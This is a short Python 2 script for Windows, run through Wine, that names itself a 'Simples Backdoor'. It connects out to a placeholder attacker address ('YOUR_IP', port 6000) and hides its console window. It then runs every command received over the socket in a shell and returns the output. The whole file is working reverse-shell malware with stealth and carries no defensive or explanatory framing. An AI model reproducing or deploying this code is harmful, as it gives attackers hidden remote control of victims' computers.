#!wine /root/.wine/drive_c/Python27/python.exe
# -*- coding: utf-8 -*-
import subprocess,socket,win32console,win32gui

HOST = 'YOUR_IP'
PORT = 6000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('Ola Bem vindo - Simples Backdoor\n')

def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
	
def main():	
	hide()
	while 1:
		var = s.recv(1024)
		if var == "exit":
			break	
		poss = subprocess.Popen(var, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdoutput = poss.stdout.read() + poss.stderr.read()
		s.send(stdoutput)
	s.send('adeus')
	s.close()
if __name__ == "__main__":
	main()	
